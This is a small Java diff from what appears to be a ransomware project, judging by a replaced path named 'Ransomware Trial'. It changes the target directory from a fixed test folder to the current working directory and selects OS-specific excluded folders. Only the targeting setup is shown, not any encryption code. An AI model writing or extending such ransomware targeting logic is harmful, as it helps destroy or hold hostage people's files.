@@ -24,7 +24,7 @@ class App {
 
     public static void main(String[] args) {
         // Paths.get(System.getProperty("user.dir"))
-        PATH = "C:\\Users\\termi\\Desktop\\Ransomware Trial\\Fullstack-Auction-Website";
+        PATH = Paths.get(System.getProperty("user.dir")).toString();
         CURR_OS_EXCLUDED_FOLDERS = OS.getCurrentOS() == OS.WINDOWS ? OS.Windows.getExcludedFolders() : OS.Linux.getExcludedFolders();
 
         Options options = new Options();
